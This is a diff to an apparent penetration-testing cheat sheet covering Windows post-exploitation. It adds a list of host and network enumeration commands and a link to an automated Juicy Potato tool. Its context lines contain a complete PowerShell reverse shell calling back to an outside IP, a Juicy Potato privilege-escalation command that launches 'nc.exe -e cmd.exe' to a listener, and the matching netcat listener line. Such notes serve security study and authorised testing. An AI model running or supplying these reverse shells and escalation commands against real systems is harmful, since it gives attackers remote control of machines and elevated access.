@@ -267,7 +267,31 @@ Pattern
                   powershell -NoP -NonI -W Hidden -Exec Bypass -ep bypass "& {$ps=$false;$hostip='1.1.1.1';$port=443;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split();$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"
                   
                   $ps
+           Gathering information
+                  systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+                  hostname
+                  echo %username%
+                  net users
+                  net user user1
+                  ipconfig /all
+                  route print
+                  arp -A
+                  netstat -ano
+                  netsh firewall show state
+                  netsh firewall show config
+                  schtasks /query /fo LIST /v
+                  tasklist /SVC
+                  DRIVERQUERY
+                  wmic qfe get Caption,Description,HotFixID,InstalledOn
+                  wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
+                  sc qc upnphost
+                   
                   
+
+
+
+
+
 
         
         4.2.1 UAC Bypass   ref: https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
@@ -341,6 +365,8 @@ Pattern
                    Place Juicy Potato and netcat on the target computer. 
                       JuicyPotato -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\wamp\www\PHP\1\fileManager\collectives\DG0\hackme\nc.exe -e cmd.exe 10.10.10.12 443" -t
                       Host: rlwrap -r nc -nlvp 
+           4.2.5 Lovely Potato - Automated Juicy Potato
+               https://github.com/TsukiCTF/Lovely-Potato/tree/e21c3a95bd8421c9584533529f00966f3ea24071
                     
                     
     4.3.Priviliege Escalation      
